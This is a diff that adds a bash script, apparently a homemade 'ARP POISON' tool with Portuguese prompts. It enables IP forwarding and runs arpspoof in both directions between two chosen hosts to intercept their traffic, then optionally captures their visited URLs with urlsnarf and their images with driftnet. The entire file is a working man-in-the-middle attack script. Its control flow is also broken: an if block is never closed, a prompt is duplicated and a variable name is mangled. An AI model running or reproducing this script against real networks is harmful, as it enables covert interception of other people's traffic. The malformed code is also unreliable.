@@ -1,0 +1,37 @@
+
+#!/bin/bash
+clear
+
+set url="N"
+
+#COLOR CONFIG
+red='\e[0;31m'
+blue='\e[0;34m'
+green='\e[0;32m'
+NC='\e[00m'
+#
+
+echo -e "${blue}Gnuh - ARP ${green}POISON${NC}"
+echo 1 > /proc/sys/net/ipv4/ip_forward
+echo "/proc/sys/net/ipv4/ip_forward" = 1
+iwconfig
+read -e -p "Digite a Interface: " i
+read -e -p "IP1: " ip1
+read -e -p "IP2: " ip2
+
+gnome-terminal --zoom=.5 -x arpspoof -i $i -t $ip1 $ip2
+gnome-terminal --zoom=.5 -x arpspoof -i $i -t $ip2 $ip1
+
+read -e -p "URLSNARF (S/N):" urlsnarf
+
+if [ "$urlsnarf" = "s" -o "$urlsnarf" = "S" ]
+then
+    gnome-terminal --zoom=.8 -x urlsnarf -i $i
+read -e -p "DRIFTNET (S/N):" driftnetfi
+
+read -e -p "DRIFTNET (S/N):" driftnet
+
+if [ "$driftnet" = "s" -o "$driftnet" = "S" ]
+then
+   driftnet -i $i &
+fi
